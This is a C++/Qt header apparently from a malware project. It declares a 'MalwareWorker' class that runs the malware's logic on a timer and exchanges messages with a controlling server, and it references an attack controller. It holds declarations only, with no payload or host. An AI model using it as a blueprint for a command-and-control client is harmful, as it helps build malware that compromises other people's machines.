#ifndef MALWAREWORKER_H
#define MALWAREWORKER_H

#include <memory>

#include <QObject>
#include <QTimer>

#include "../Controllers/attackcontroller.h"
#include "../SharedKernel/Network/serveradapter.h"
#include "../Processors/processorresolverbase.h"

namespace workers
{
    /**
     * @brief The worker that manages the logic of the malware and the communication with the server.
     */
    class MalwareWorker : public QObject
    {
        Q_OBJECT

    public:
        /**
         * @brief Creates a new instance of the class MalwareWorker.
         */
        MalwareWorker();

    private:
        std::unique_ptr<network::ServerAdapter> serverAdapter_;
        std::unique_ptr<processors::ProcessorResolverBase> processorResolver_;
        std::unique_ptr<QTimer> timer_;
        bool hasEmittedHello_ = false;
        bool isInError = false;

    public slots:
        /**
         * @brief Executes the logic of the malware.
         */
        void doWork();

    private slots:
        /**
         * @brief The logic to be executed at a regular interval.
         */
        void onTick();

        /**
         * @brief The slot is triggered when a message is received from the server.
         * @param message The message received.
         */
        void onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message);

        /**
         * @brief The slot is triggered when the server acknowledge any communication with the client,
         * regardless whether a message has been received.
         */
        void onServerReplied();

        /**
         * @brief The slot is triggered when the client cannot communicate with the server.
         * @param error A message that represents the error.
         */
        void onError(QString error);
    };
}

#endif // MALWAREWORKER_H
